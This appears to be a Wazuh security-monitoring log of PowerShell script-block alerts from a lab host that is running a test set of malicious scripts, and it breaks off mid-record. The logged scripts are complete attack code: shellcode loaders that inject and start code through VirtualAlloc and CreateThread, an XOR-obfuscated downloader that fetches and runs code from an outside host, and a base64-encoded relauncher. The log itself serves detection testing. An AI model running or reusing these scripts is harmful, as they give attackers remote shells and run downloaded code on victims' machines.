{"timestamp":"2026-07-06T02:20:29.293+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":143,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304429.3339995","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:49.1543287Z","eventRecordID":"145430","processID":"8508","threadID":"6248","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$eYbQ = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $eYbQ -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc4,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xbb,0xca,0x22,0xa8,0x57,0xb1,0x47,0x83,0xc5,0x04,0x31,0x5d,0x14,0x03,0x5d,0xde,0xc0,0x5d,0xab,0x36,0x86,0x9e,0x54,0xc6,0xe7,0x17,0xb1,0xf7,0x27,0x43,0xb1,0xa7,0x97,0x07,0x97,0x4b,0x53,0x45,0x0c,0xd8,0x11,0x42,0x23,0x69,0x9f,0xb4,0x0a,0x6a,0x8c,0x85,0x0d,0xe8,0xcf,0xd9,0xed,0xd1,0x1f,0x2c,0xef,0x16,0x7d,0xdd,0xbd,0xcf,0x09,0x70,0x52,0x64,0x47,0x49,0xd9,0x36,0x49,0xc9,0x3e,0x8e,0x68,0xf8,0x90,0x85,0x32,0xda,0x13,0x4a,0x4f,0x53,0x0c,0x8f,0x6a,0x2d,0xa7,0x7b,0x00,0xac,0x61,0xb2,0xe9,0x03,0x4c,0x7b,0x18,0x5d,0x88,0xbb,0xc3,0x28,0xe0,0xb8,0x7e,0x2b,0x37,0xc3,0xa4,0xbe,0xac,0x63,0x2e,0x18,0x09,0x92,0xe3,0xff,0xda,0x98,0x48,0x8b,0x85,0xbc,0x4f,0x58,0xbe,0xb8,0xc4,0x5f,0x11,0x49,0x9e,0x7b,0xb5,0x12,0x44,0xe5,0xec,0xfe,0x2b,0x1a,0xee,0xa1,0x94,0xbe,0x64,0x4f,0xc0,0xb2,0x26,0x07,0x25,0xff,0xd8,0xd7,0x21,0x88,0xab,0xe5,0xee,0x22,0x24,0x45,0x66,0xed,0xb3,0xaa,0x5d,0x49,0x2b,0x55,0x5e,0xaa,0x65,0x91,0x0a,0xfa,0x1d,0x30,0x33,0x91,0xdd,0xbd,0xe6,0x0c,0xdb,0x29,0xc9,0x79,0xe2,0xc3,0xa1,0x7b,0xe5,0x12,0x89,0xf5,0x03,0x44,0xbd,0x55,0x9c,0x24,0x6d,0x16,0x4c,0xcc,0x67,0x99,0xb3,0xec,0x87,0x73,0xdc,0x86,0x67,0x2a,0xb4,0x3e,0x11,0x77,0x4e,0xdf,0xde,0xad,0x2a,0xdf,0x55,0x42,0xca,0x91,0x9d,0x2f,0xd8,0x45,0x6e,0x7a,0x82,0xc3,0x71,0x50,0xa9,0xeb,0xe7,0x5f,0x78,0xbc,0x9f,0x5d,0x5d,0x8a,0x3f,0x9d,0x88,0x81,0xf6,0x0b,0x73,0xfd,0xf6,0xdb,0x73,0xfd,0xa0,0xb1,0x73,0x95,0x14,0xe2,0x27,0x80,0x5a,0x3f,0x54,0x19,0xcf,0xc0,0x0d,0xce,0x58,0xa9,0xb3,0x29,0xae,0x76,0x4b,0x1c,0x2e,0x4a,0x9a,0x58,0x44,0xa2,0x1e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$uwQ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($uwQ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$uwQ,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 4735cf06-16b4-49ff-a656-ee88e3b37df5\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2816.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$eYbQ = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $eYbQ -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc4,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xbb,0xca,0x22,0xa8,0x57,0xb1,0x47,0x83,0xc5,0x04,0x31,0x5d,0x14,0x03,0x5d,0xde,0xc0,0x5d,0xab,0x36,0x86,0x9e,0x54,0xc6,0xe7,0x17,0xb1,0xf7,0x27,0x43,0xb1,0xa7,0x97,0x07,0x97,0x4b,0x53,0x45,0x0c,0xd8,0x11,0x42,0x23,0x69,0x9f,0xb4,0x0a,0x6a,0x8c,0x85,0x0d,0xe8,0xcf,0xd9,0xed,0xd1,0x1f,0x2c,0xef,0x16,0x7d,0xdd,0xbd,0xcf,0x09,0x70,0x52,0x64,0x47,0x49,0xd9,0x36,0x49,0xc9,0x3e,0x8e,0x68,0xf8,0x90,0x85,0x32,0xda,0x13,0x4a,0x4f,0x53,0x0c,0x8f,0x6a,0x2d,0xa7,0x7b,0x00,0xac,0x61,0xb2,0xe9,0x03,0x4c,0x7b,0x18,0x5d,0x88,0xbb,0xc3,0x28,0xe0,0xb8,0x7e,0x2b,0x37,0xc3,0xa4,0xbe,0xac,0x63,0x2e,0x18,0x09,0x92,0xe3,0xff,0xda,0x98,0x48,0x8b,0x85,0xbc,0x4f,0x58,0xbe,0xb8,0xc4,0x5f,0x11,0x49,0x9e,0x7b,0xb5,0x12,0x44,0xe5,0xec,0xfe,0x2b,0x1a,0xee,0xa1,0x94,0xbe,0x64,0x4f,0xc0,0xb2,0x26,0x07,0x25,0xff,0xd8,0xd7,0x21,0x88,0xab,0xe5,0xee,0x22,0x24,0x45,0x66,0xed,0xb3,0xaa,0x5d,0x49,0x2b,0x55,0x5e,0xaa,0x65,0x91,0x0a,0xfa,0x1d,0x30,0x33,0x91,0xdd,0xbd,0xe6,0x0c,0xdb,0x29,0xc9,0x79,0xe2,0xc3,0xa1,0x7b,0xe5,0x12,0x89,0xf5,0x03,0x44,0xbd,0x55,0x9c,0x24,0x6d,0x16,0x4c,0xcc,0x67,0x99,0xb3,0xec,0x87,0x73,0xdc,0x86,0x67,0x2a,0xb4,0x3e,0x11,0x77,0x4e,0xdf,0xde,0xad,0x2a,0xdf,0x55,0x42,0xca,0x91,0x9d,0x2f,0xd8,0x45,0x6e,0x7a,0x82,0xc3,0x71,0x50,0xa9,0xeb,0xe7,0x5f,0x78,0xbc,0x9f,0x5d,0x5d,0x8a,0x3f,0x9d,0x88,0x81,0xf6,0x0b,0x73,0xfd,0xf6,0xdb,0x73,0xfd,0xa0,0xb1,0x73,0x95,0x14,0xe2,0x27,0x80,0x5a,0x3f,0x54,0x19,0xcf,0xc0,0x0d,0xce,0x58,0xa9,0xb3,0x29,0xae,0x76,0x4b,0x1c,0x2e,0x4a,0x9a,0x58,0x44,0xa2,0x1e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$uwQ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($uwQ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$uwQ,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"4735cf06-16b4-49ff-a656-ee88e3b37df5","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2816.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:29.370+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":4,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304429.3351352","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:49.8893673Z","eventRecordID":"145434","processID":"8232","threadID":"5416","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$wC=NEW-OBjeCT SYStEm.NeT.WEBClIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeadErS.ADD('User-Agent',$u);$WC.PROXY = [SYsteM.Net.WebReQuEsT]::DefaULtWEbProxy;$wC.PrOxY.CrEDeNTIALs = [SysTeM.Net.CREdeNTialCACHe]::DEfAuLTNetWORKCREDENTialS;$K='-X3ex5fP{c4>8Yk}*+OES7h:zm%]r~td';$i=0;[CHAR[]]$B=([CHaR[]]($WC.DOwNLOAdSTrING(\"http://192.168.1.100:40/index.asp\")))|%{$_-BXoR$K[$I++%$k.LenGth]};IEX ($B-joIN'')\r\n\r\nScriptBlock ID: 49cccb16-0db3-4ade-bea7-d0df42d4e7f9\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2822.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$wC=NEW-OBjeCT SYStEm.NeT.WEBClIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeadErS.ADD('User-Agent',$u);$WC.PROXY = [SYsteM.Net.WebReQuEsT]::DefaULtWEbProxy;$wC.PrOxY.CrEDeNTIALs = [SysTeM.Net.CREdeNTialCACHe]::DEfAuLTNetWORKCREDENTialS;$K='-X3ex5fP{c4&gt;8Yk}*+OES7h:zm%]r~td';$i=0;[CHAR[]]$B=([CHaR[]]($WC.DOwNLOAdSTrING(\\\"http://192.168.1.100:40/index.asp\\\")))|%{$_-BXoR$K[$I++%$k.LenGth]};IEX ($B-joIN'')","scriptBlockId":"49cccb16-0db3-4ade-bea7-d0df42d4e7f9","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2822.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:30.846+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":144,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304430.3355144","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:50.7077811Z","eventRecordID":"145438","processID":"1936","threadID":"8612","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbf,0x35,0x1d,0x76,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = \"-enc \";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $3 $2 $e\"}else{;iex \"& powershell $2 $e\";}\r\n\r\nScriptBlock ID: cd02d6ce-cd7e-4da1-abce-18aaec7abfb2\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2832.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$1 = '$c = ''[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbf,0x35,0x1d,0x76,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = \\\"-enc \\\";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell\\\";iex \\\"&amp; $3 $2 $e\\\"}else{;iex \\\"&amp; powershell $2 $e\\\";}","scriptBlockId":"cd02d6ce-cd7e-4da1-abce-18aaec7abfb2","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2832.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:31.033+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":145,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304431.3367169","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:51.4968653Z","eventRecordID":"145443","processID":"7144","threadID":"8860","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0xc0,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 966a7aa8-2cf7-4316-a85d-9eab030e3ae6\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2846.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0xc0,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"966a7aa8-2cf7-4316-a85d-9eab030e3ae6","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2846.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:31.812+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":146,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304431.3378118","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:52.3116453Z","eventRecordID":"145447","processID":"5848","threadID":"8080","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 